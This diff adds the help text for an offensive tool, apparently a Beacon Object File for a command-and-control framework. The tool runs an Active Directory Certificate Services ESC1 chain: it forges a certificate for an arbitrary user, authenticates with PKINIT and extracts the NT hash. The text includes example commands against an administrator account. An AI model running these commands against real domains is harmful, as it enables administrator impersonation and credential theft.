@@ -1,0 +1,23 @@
+ABOUT
+    Performs a complete ADCS ESC1 attack chain. Requests a certificate with
+    arbitrary Subject Alternative Name (and SID for KB5014754 bypass),
+    authenticates via PKINIT, and extracts the NT hash via UnPAC the hash.
+USAGE:
+    bof-esc1-unpac --- <CA> <template> <UPN> [KDC] [nosid]
+
+ARGUMENTS:
+    CA                  Certificate Authority (e.g. EVILCA1.evilcorp.net\evilcorp-EVILCA1-CA)
+    template            Vulnerable ESC1 certificate template name
+    UPN                 Target user UPN (e.g. administrator@evilcorp.net)
+    KDC                 Optional domain controller hostname or IP
+    nosid               Optional. Pass nosid to request certificate without SID
+
+EXAMPLES:
+    bof-esc1-unpac --- EVILCA1.evilcorp.net\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-esc1-unpac -w 60 --- EVILCA1.evilcorp.net\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
